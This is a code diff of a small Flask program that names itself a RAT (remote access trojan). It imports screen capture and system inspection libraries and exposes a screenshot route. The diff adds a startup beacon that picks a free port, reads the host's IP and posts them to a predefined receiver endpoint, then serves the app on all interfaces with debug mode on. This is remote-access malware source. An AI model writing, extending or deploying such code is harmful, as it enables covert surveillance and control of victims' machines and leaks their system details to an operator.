@@ -1,12 +1,8 @@
 from flask import Flask, jsonify, request, send_file
-import requests, os, getpass, platform, psutil, mss, io
+import requests, os, getpass, platform, psutil, mss, socket
 
-app = Flask(__name__)
-
-# Predefined endpoint to send the data
+app = Flask("There is a RAT on your machine")
 PREDEFINED_ENDPOINT = "http://0.0.0.0:8080/receiver"
-is_running = True
-
 
 @app.route("/")
 def root():
@@ -54,4 +50,12 @@ def make_screen():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port="5000", debug=True)
+    def find_free_port():
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(('', 0))
+            return s.getsockname()[1]
+
+    port = find_free_port()
+    ip = socket.gethostbyname(socket.gethostname())
+    requests.post(PREDEFINED_ENDPOINT, json={"status": "online", "ip": ip, "port": port})
+    app.run(host="0.0.0.0", port=port, debug=True)
